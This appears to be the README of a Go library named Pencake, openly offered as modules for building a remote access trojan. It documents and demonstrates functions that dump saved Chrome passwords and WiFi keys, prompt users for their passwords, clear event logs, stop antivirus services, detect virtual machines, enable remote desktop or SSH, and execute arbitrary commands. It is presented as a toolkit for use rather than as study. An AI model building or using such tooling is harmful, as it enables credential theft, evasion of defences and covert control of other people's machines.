# Pencake
Modules you need for building a rat!

### Example
Getting all your chrome passwords
```go
package main

import (
	"fmt"
	"github.com/shouc/pencake"
)

func main()  {
	fmt.Println(pencake.ChromePassword())
}

/*
Ouput:
[{https://sso.stupid.edu shou@stupid.edu password} ...]
*/
```

### Getting Started

```bash
go get -u github.com/shouc/pencake
```

### Usage
| Function Name         | Description                              | Returns                      | Requirement                     | OS              |
| --------------------- | ---------------------------------------- | ---------------------------- | ------------------------------- | --------------- |
| `AskPass()`             | Ask user about their password            | `string` (user input)          | /                               | macOS           |
| `ChromePassword()`      | Dump user's saved password in Chrome     | `pencake.ChromePasswordStruct` | root privilege on macOS & Linux | All             |
| `ClearLogs()`           | Clear event logs                         | `bool` (whether successful)    | administrator                   | Windows         |
| `DisableRemote()`       | Stop either SSH or RDP                   | /                            | root or administrator           | All             |
| `Environment()`         | Get all environment variables            | `pencake.EnvironmentStruct`    | /                               | All             |
| `Exec(command string)`  | Execute bash code                        | `string` (output)              | /                               | All             |
| `KillAv()`              | Stop all anti-virus services             | `string` (AV name)             | administrator                   | Windows         |
| `Popup(message string)` | Pop up a message box                     | /                            | /                               | macOS / Windows |
| `RemoteControl()`       | Start either RDP or SSH                  | /                            | root or administrator           | macOS / Windows |
| `Restart()`             | Restart system                           | /                            | depend on system                | All             |
| `Shutdown()`            | Shutdown system                          | /                            | depend on system                | All             |
| `Sleep()`               | Sleep system                             | /                            | /                               | All             |
| `SysInfo()`             | Get system information                   | `pencake.SysInfoStruct`        | /                               | All             |
| `Unsleep()`             | Exit sleeping                            | /                            | /                               | All             |
| `VmScan()`              | Scan whether system is running on the VM | `string` (VM name)             | /                               | All             |
| `WifiKey()`             | Get all saved WiFi names and passwords   | `pencake.WifiKeyStruct`        | depend on system                | All             |


### Data Structure

`pencake.ChromePasswordStruct`

```go
type ChromePasswordStruct struct {
	Url      string
	UserName string
	Password string
}
```

`pencake.EnvironmentStruct`

```go
type EnvironmentStruct struct {
	Key   string
	Value string
}
```

`pencake.SysInfoStruct`

```go
type SysInfoStruct struct {
	Os       string
    Arch     string
    UserName string
    Name     string
    IsAdmin  bool
    PublicIp string
}
```

`pencake.WifiKeyStruct`

```go
type WifiKeyStruct struct {
	Name     string
    Password string
}
```